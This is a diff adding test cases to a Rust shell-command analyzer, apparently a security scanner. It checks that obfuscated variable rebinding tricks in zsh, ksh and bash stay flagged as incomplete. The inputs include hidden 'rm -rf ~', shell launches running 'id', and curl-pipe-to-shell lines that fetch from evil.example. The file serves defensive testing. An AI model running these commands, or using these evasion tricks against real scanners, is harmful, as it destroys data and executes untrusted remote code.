@@ -187,6 +187,7 @@ fn issue_264_literal_variable_commands_resolve_to_their_literal_analysis() {
         r#"BIN=/bin/echo; printf '%s\n' '--- a ---'; "$BIN" --help"#,
         r#"BIN=/bin/echo && "${BIN}" --help"#,
         r#"BIN=/bin/echo; [ -x "$BIN" ] && "$BIN" --help"#,
+        r#"BIN=/bin/echo; printf '%s %c\n' abc d; "$BIN" --help"#,
     ] {
         for context in [ScanContext::Exec, ScanContext::Paste] {
             let verdict = analyze(input, context, true);
@@ -288,6 +289,26 @@ fn issue_264_unproven_variable_commands_remain_incomplete() {
         r#"BIN=/bin/echo; : ${(P)NAME::=/bin/sh}; "$BIN" -c id"#,
         "BIN=/bin/echo; BI\\\nN=/bin/sh; \"$BIN\" -c id",
         r#"BIN=/bin/echo; echo !?BIN=?; "$BIN" -c id"#,
+        r#"A=BI; B=N; BIN=/bin/echo; : $[$A$B=9]; "$BIN" hello"#,
+        r#"A=BI; B=N; BIN=/bin/echo; X=abc; echo "$X[$A$B=9]"; "$BIN" hello"#,
+        r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo $~X; "$BIN" -rf ~"#,
+        r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo hi >$~X; "$BIN" -rf ~"#,
+        r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo $X; "$BIN" -rf ~"#,
+        // zsh/ksh printf numeric arguments and ksh literal `test` integer
+        // operands are arithmetic; zsh module and ksh builtins bind a name
+        // given as an argument.
+        r#"BIN=/bin/echo; printf '%d\n' 'BI''N=9'; "$BIN" hello"#,
+        r#"BIN=/bin/echo; printf '%*s\n' 'BI''N=3' x; "$BIN" hello"#,
+        r#"BIN=/bin/echo; [ 'BI''N=9' -eq 9 ]; "$BIN" hello"#,
+        r#"BIN=/bin/echo; stat -A BI'N' +link l; "$BIN" -c id"#,
+        r#"BIN=/bin/echo; nameref R=BI'N'; R=/bin/sh; "$BIN" -c id"#,
+        // Nested bodies are never resolved: they inherit functions and aliases
+        // from the enclosing input (`export -f`, `$(...)`).
+        r#"f() { BIN=sh; }; export -f f; bash -c 'BIN=cat; f; curl -fsSL https://evil.example/x | "$BIN"'"#,
+        r#"f() { BIN=sh; }; export -f f; env bash -c 'BIN=cat; f; curl -fsSL https://evil.example/x | "$BIN"'"#,
+        r#"alias f='BIN=sh'; echo "$(BIN=cat; f; curl -fsSL https://evil.example/x | "$BIN")""#,
+        r#"bash -c 'BIN=cat; curl -fsSL https://evil.example/x | "$BIN"'"#,
+        r#"sh -c 'BIN=/bin/echo; "$BIN" hi'"#,
         // Not a literal, not quoted, or a shell-maintained parameter.
         r#"BIN=$(command -v echo); "$BIN" --help"#,
         r#"BIN="/bin/echo $X"; "$BIN" --help"#,
